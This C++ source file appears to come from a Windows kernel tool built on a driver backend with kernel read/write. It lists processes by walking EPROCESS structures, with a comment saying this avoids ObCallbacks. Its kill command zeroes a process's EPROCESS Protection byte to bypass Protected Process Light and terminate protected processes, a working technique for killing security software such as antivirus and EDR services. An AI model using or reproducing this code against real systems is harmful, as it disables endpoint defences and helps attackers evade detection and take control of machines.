#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <cstdio>
#include <string>
#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include "jutil.h"
#include "ansi.h"

static const char* ProtColor(BYTE prot) {
    if (prot == 0) return "";
    BYTE type = prot & 0x7;
    if (type == 2) return A_CYAN;   // PP  (full protected process)
    if (type == 1) return A_YELLOW; // PPL (protected process light)
    return A_DIM;
}

// ─── /proc ───────────────────────────────────────────────────────────────────
// Enumerate processes via EPROCESS kernel walk (no OpenProcess = no ObCallbacks).
// For non-System processes, also try OpenProcess to get full image path.
// Falls back to EPROCESS.ImageFileName (15 chars) when OpenProcess is denied.

static const char* IntegrityStr(DWORD rid) {
    if (rid < 0x1000) return "Untrusted";
    if (rid < 0x2000) return "Low";
    if (rid < 0x3000) return "Medium";
    if (rid < 0x4000) return "High";
    if (rid < 0x5000) return "System";
    return "Protected";
}

static void GetIntegrity(HANDLE hProc, char* out, size_t sz) {
    HANDLE hTok;
    if (!OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) { strcpy_s(out, sz, "?"); return; }
    DWORD needed;
    GetTokenInformation(hTok, TokenIntegrityLevel, nullptr, 0, &needed);
    auto* buf = (TOKEN_MANDATORY_LABEL*)malloc(needed);
    if (buf && GetTokenInformation(hTok, TokenIntegrityLevel, buf, needed, &needed)) {
        DWORD rid = *GetSidSubAuthority(buf->Label.Sid,
            *GetSidSubAuthorityCount(buf->Label.Sid) - 1);
        strcpy_s(out, sz, IntegrityStr(rid));
    } else { strcpy_s(out, sz, "?"); }
    free(buf);
    CloseHandle(hTok);
}

void CmdProc() {
    SetConsoleOutputCP(CP_UTF8);
    auto procs = KUtil::EnumProcesses();

    if (g_jsonMode) {
        printf("{\"command\":\"proc\",\"processes\":[\n");
        bool first = true;
        for (auto& p : procs) {
            char integrity[16] = "?";
            char path[MAX_PATH] = {};
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, p.pid);
            if (hProc) {
                DWORD sz = MAX_PATH;
                QueryFullProcessImageNameA(hProc, 0, path, &sz);
                GetIntegrity(hProc, integrity, sizeof(integrity));
                CloseHandle(hProc);
            }
            if (!path[0]) strcpy_s(path, p.name);
            if (!first) printf(",\n");
            first = false;
            printf(" {\"pid\":%u,\"ppid\":%u,\"threads\":%u,\"protection\":%s,"
                   "\"name\":%s,\"integrity\":%s,\"path\":%s}",
                p.pid, p.ppid, p.activeThreads,
                JEscape(KUtil::ProtectionStr(p.protection)).c_str(),
                JEscape(p.name).c_str(),
                JEscape(integrity).c_str(),
                JEscape(path).c_str());
        }
        printf("\n]}\n");
        return;
    }

    // Header
    printf("\n%-6s %-6s %-7s %-6s %-16s %-14s %s\n",
        "PID", "PPID", "Threads", "Prot", "Name", "Integrity", "Path");
    printf("%s\n", std::string(110, '-').c_str());

    for (auto& p : procs) {
        char integrity[16] = "?";
        char path[MAX_PATH] = {};

        HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, p.pid);
        if (hProc) {
            DWORD sz = MAX_PATH;
            QueryFullProcessImageNameA(hProc, 0, path, &sz);
            GetIntegrity(hProc, integrity, sizeof(integrity));
            CloseHandle(hProc);
        }

        const char* displayName = (path[0] ? strrchr(path, '\\') + 1 : p.name);
        if (!path[0]) strcpy_s(path, p.name);

        const char* col = ProtColor(p.protection);
        printf("%-6u %-6u %-7u %s%-6s%s %-16s %-14s %s\n",
            p.pid, p.ppid, p.activeThreads,
            col, KUtil::ProtectionStr(p.protection), A_RESET,
            displayName,
            integrity,
            path);
    }
    printf("\n  Total: %zu processes\n\n", procs.size());
}

// ─── /kill ────────────────────────────────────────────────────────────────────
// Strategy:
//   1. Try TerminateProcess normally.
//   2. If access denied: find EPROCESS, clear Protection byte (PPL bypass),
//      retry TerminateProcess, restore Protection if kill fails.
// We deliberately do NOT use handle table corruption — it risks kernel panic.

void CmdKill(DWORD pid) {
    if (pid == 0 || pid == 4) {
        printf("[!] Refusing to kill pid %u (System/Idle — would BSOD)\n", pid);
        return;
    }

    printf("[*] Attempting to terminate pid %u...\n", pid);

    // Step 1: normal kill
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProc) {
        if (TerminateProcess(hProc, 1)) {
            printf("[+] Terminated (normal).\n");
            CloseHandle(hProc);
            return;
        }
        CloseHandle(hProc);
    }

    // Step 2: PPL bypass via EPROCESS.Protection
    printf("[*] Normal kill failed (err=%lu). Trying kernel PPL bypass...\n", GetLastError());

    DWORD64 eproc = KUtil::FindEPROCESS(pid);
    if (!eproc) {
        printf("[!] EPROCESS not found for pid %u.\n", pid);
        return;
    }
    printf("[*] EPROCESS @ %p\n", (void*)eproc);

    BYTE origProt = g_drv->Rd8(eproc + KUtil::EP_Protection);
    printf("[*] Protection byte: 0x%02x (%s) -> clearing to 0x00\n",
        origProt, KUtil::ProtectionStr(origProt));

    g_drv->Wr8(eproc + KUtil::EP_Protection, 0);

    hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProc) {
        if (TerminateProcess(hProc, 1)) {
            printf("[+] Terminated (PPL bypassed).\n");
            CloseHandle(hProc);
            return;
        }
        CloseHandle(hProc);
    }

    // Restore protection if kill still failed
    printf("[!] Still failed (err=%lu). Restoring protection.\n", GetLastError());
    g_drv->Wr8(eproc + KUtil::EP_Protection, origProt);
}
